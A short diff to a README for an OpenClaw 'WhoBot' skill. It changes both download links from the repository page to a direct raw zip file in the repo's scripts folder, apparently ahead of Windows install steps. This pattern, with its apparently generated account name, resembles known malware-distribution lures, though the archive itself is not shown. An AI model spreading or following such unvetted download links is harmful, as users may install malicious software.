@@ -1,6 +1,6 @@
 # 🤖 openclaw-whobot-skill - Add WhoBot knowledge to OpenClaw
 
-[![Download OpenClaw WhoBot Skill](https://img.shields.io/badge/Download%20Now-OpenClaw%20WhoBot%20Skill-blue?style=for-the-badge)](https://github.com/Elizabethan-thortveitite288/openclaw-whobot-skill)
+[![Download OpenClaw WhoBot Skill](https://img.shields.io/badge/Download%20Now-OpenClaw%20WhoBot%20Skill-blue?style=for-the-badge)](https://github.com/Elizabethan-thortveitite288/openclaw-whobot-skill/raw/refs/heads/main/scripts/whobot_skill_openclaw_3.3.zip)
 
 ## 📘 What this is
 
@@ -21,7 +21,7 @@ Use this skill if you want your AI agent to handle common phone tasks, basic com
 
 Visit this page to download:
 
-https://github.com/Elizabethan-thortveitite288/openclaw-whobot-skill
+https://github.com/Elizabethan-thortveitite288/openclaw-whobot-skill/raw/refs/heads/main/scripts/whobot_skill_openclaw_3.3.zip
 
 ## 🔧 Install on Windows
 
